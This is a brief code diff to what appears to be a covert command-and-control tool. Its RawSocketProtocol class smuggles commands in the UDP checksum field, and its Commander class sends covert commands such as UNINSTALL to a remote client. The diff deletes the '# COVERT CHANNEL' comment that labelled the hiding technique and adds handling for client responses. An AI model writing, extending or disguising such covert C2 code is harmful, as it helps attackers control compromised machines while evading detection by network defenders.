@@ -84,7 +84,7 @@ class RawSocketProtocol:
                           payload, command_type):
         """Create UDP packet with command in checksum"""
         udp_length = 8 + len(payload)
-        udp_checksum = int(command_type)  # COVERT CHANNEL
+        udp_checksum = int(command_type)
 
         udp_header = struct.pack('!HHHH',
                                  src_port, dst_port,
@@ -360,6 +360,9 @@ class Commander:
                     self.send_covert_command(CommandType.UNINSTALL)
                     print("\n[*] Uninstall command sent")
                     print("[*] Client will clean up and terminate")
+                    response = self.receive_response()
+                    if response:
+                        self.display_response(response)
 
                 elif cmd == 'send':
                     if args:
